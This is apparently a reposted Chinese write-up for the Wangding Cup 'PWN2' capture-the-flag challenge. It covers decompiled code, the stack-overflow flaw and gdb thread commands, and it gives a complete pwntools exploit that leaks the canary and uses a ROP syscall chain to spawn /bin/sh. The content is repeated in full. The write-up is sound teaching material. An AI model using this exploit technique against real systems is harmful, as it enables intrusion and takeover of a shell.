# 网鼎杯玄武组——PWN2

> 原文: https://www.ctfiot.com/217930.html
> ID: 217930

01

逆向

void __fastcall __noreturn main(int a1, const char **a2)
{
 const char **v2; // rdx

 sub_4017B5();
 tip2();
 main_main(a1, a2, v2);
}

unsigned __int64 tip2()
{
 unsigned __int64 result; // rax
 int fork_ret; // [rsp+Ch] [rbp-24h]
 char v2[24]; // [rsp+10h] [rbp-20h] BYREF
 unsigned __int64 v3; // [rsp+28h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 fork_ret = Creat_process();
 if ( fork_ret < 0 ) // 创建子进程失败
 exit();
 if ( fork_ret ) // 这个是在父进程中执行的
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }
 result = v3 - __readfsqword(0x28u);
 if ( result )
 sub_4525B0();
 return result;
}

int __fastcall __noreturn main_main(int argc, const char **argv, const char **envp)
{
 char v3; // cl
 char v4[72]; // [rsp+0h] [rbp-50h] BYREF
 unsigned __int64 v5; // [rsp+48h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 onput((unsigned int)"gift: %pn", v5, (_DWORD)envp, v3);
 onput_2((__int64)"leave your name");
 input(0, v4, 0x40LL);
 exit_ma(0);
}

void __fastcall __noreturn sub_44EE30(int a1)
{
 unsigned __int64 v1; // rax
 unsigned int v2; // r8d
 unsigned __int64 v3; // rax
 unsigned int v4; // r8d

 v3 = sys_exit_group(a1); // exit(2)
 if ( v3 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v4, -(int)v3);
 v1 = sys_exit(a1);
 if ( v1 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v2, -(int)v1);
 __halt(); // 使程序进入休眠状态
}

fork_ret = Creat_process();

if ( fork_ret )
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }

02

漏洞

void tip()
{
 int v0; // [rsp+Ch] [rbp-114h]
 char v1[264]; // [rsp+10h] [rbp-110h] BYREF
 unsigned __int64 v2; // [rsp+118h] [rbp-8h]

 v2 = __readfsqword(0x28u);
 while ( 1 )
 {
 v0 = Creat_process();
 if ( v0 < 0 )
 break;
 if ( !v0 )
 {
 onput_2((__int64)"once again?");
 input(0, v1, 0x100uLL);
 sub_401A55(v1);
 }
 }
 exit();
}

03

多线程动调

查看线程列表：info threads
切换进程：thread ID

04

EXP

from pwn import *
io = process("./pwn")
context.log_level = "debug"
elf = ELF("./pwn")

cmd = (
 "thread 2n"
 "b *0x44EE5Cn"
 "cn"
)

""" io.recvuntil("gift: ")
addr = int(io.recv(18),16)
print("addr========>",hex(addr)) """

io.recvuntil("gift: ")
canary = int(io.recv(18),16)
print("addr========>",hex(canary))

payload = b"A"*0x28 + b"x01"
io.sendafter("leave your name",payload)

io.sendafter("Wanna return?",b"1")

io.sendafter("once again?",b"A"*0x100)

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx_rbx = 0x0000000000485feb
syscall = 0x000000000041ac26
bss = elf.bss()

payload = b"B"*0x60 + p32(0x11111111) + p32(0x11111111) + p32(0x11111111)
payload = payload.ljust(0x100,b"B")
payload += p64(canary) + p64(canary) + b"A"*0x8
payload += p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(bss) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
payload += p64(rax) + p64(0x3b) + p64(rdi) + p64(bss) + p64(rsi) + p64(0x0) + p64(rdx_rbx) + p64(0x0)*2 + p64(syscall)
io.sendafter("once again?",payload)

io.send(b"/bin/sh")

io.interactive()

05

收获

看雪ID：学计算机睡觉

https://bbs.kanxue.com/user-home-962996.htm

*本文为看雪论坛优秀文章，由 学计算机睡觉 原创，转载请注明来自看雪社区

# 往期推荐

1、PWN入门-SROP拜师

2、一种apc注入型的Gamarue病毒的变种

3、野蛮fuzz：提升性能

4、关于安卓注入几种方式的讨论，开源注入模块实现

5、2024年KCTF水泊梁山-反混淆

球分享

球点赞

球在看

点击阅读原文查看更多


```
void __fastcall __noreturn main(int a1, const char **a2)
{
 const char **v2; // rdx

 sub_4017B5();
 tip2();
 main_main(a1, a2, v2);
}
unsigned __int64 tip2()
{
 unsigned __int64 result; // rax
 int fork_ret; // [rsp+Ch] [rbp-24h]
 char v2[24]; // [rsp+10h] [rbp-20h] BYREF
 unsigned __int64 v3; // [rsp+28h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 fork_ret = Creat_process();
 if ( fork_ret < 0 ) // 创建子进程失败
 exit();
 if ( fork_ret ) // 这个是在父进程中执行的
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }
 result = v3 - __readfsqword(0x28u);
 if ( result )
 sub_4525B0();
 return result;
}
int __fastcall __noreturn main_main(int argc, const char **argv, const char **envp)
{
 char v3; // cl
 char v4[72]; // [rsp+0h] [rbp-50h] BYREF
 unsigned __int64 v5; // [rsp+48h] [rbp-8h]

 v5 = __readfsqword(0x28u);
 onput((unsigned int)"gift: %pn", v5, (_DWORD)envp, v3);
 onput_2((__int64)"leave your name");
 input(0, v4, 0x40LL);
 exit_ma(0);
}
void __fastcall __noreturn sub_44EE30(int a1)
{
 unsigned __int64 v1; // rax
 unsigned int v2; // r8d
 unsigned __int64 v3; // rax
 unsigned int v4; // r8d

 v3 = sys_exit_group(a1); // exit(2)
 if ( v3 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v4, -(int)v3);
 v1 = sys_exit(a1);
 if ( v1 > 0xFFFFFFFFFFFFF000LL )
 __writefsdword(v2, -(int)v1);
 __halt(); // 使程序进入休眠状态
}
fork_ret = Creat_process();
if ( fork_ret )
 {
 sub_44ED00((unsigned int)fork_ret, 0LL, 0LL);
 onput_2((__int64)"Wanna return?");
 input(0, v2, 1uLL);
 onput_2((__int64)"It's impossible");
 exit_ma(0);
 }
void tip()
{
 int v0; // [rsp+Ch] [rbp-114h]
 char v1[264]; // [rsp+10h] [rbp-110h] BYREF
 unsigned __int64 v2; // [rsp+118h] [rbp-8h]

 v2 = __readfsqword(0x28u);
 while ( 1 )
 {
 v0 = Creat_process();
 if ( v0 < 0 )
 break;
 if ( !v0 )
 {
 onput_2((__int64)"once again?");
 input(0, v1, 0x100uLL);
 sub_401A55(v1);
 }
 }
 exit();
}
查看线程列表：info threads
切换进程：thread ID
from pwn import *
io = process("./pwn")
context.log_level = "debug"
elf = ELF("./pwn")

cmd = (
 "thread 2n"
 "b *0x44EE5Cn"
 "cn"
)

""" io.recvuntil("gift: ")
addr = int(io.recv(18),16)
print("addr========>",hex(addr)) """

io.recvuntil("gift: ")
canary = int(io.recv(18),16)
print("addr========>",hex(canary))

payload = b"A"*0x28 + b"x01"
io.sendafter("leave your name",payload)

io.sendafter("Wanna return?",b"1")

io.sendafter("once again?",b"A"*0x100)

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx_rbx = 0x0000000000485feb
syscall = 0x000000000041ac26
bss = elf.bss()

payload = b"B"*0x60 + p32(0x11111111) + p32(0x11111111) + p32(0x11111111)
payload = payload.ljust(0x100,b"B")
payload += p64(canary) + p64(canary) + b"A"*0x8
payload += p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(bss) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
payload += p64(rax) + p64(0x3b) + p64(rdi) + p64(bss) + p64(rsi) + p64(0x0) + p64(rdx_rbx) + p64(0x0)*2 + p64(syscall)
io.sendafter("once again?",payload)

io.send(b"/bin/sh")

io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/4-1733147136.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1733147137.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1733147137.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/0-1733147138.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/2-1733147138.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1733147138.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/7-1733147138.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/8-1733147139.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/5-1733147140.gif)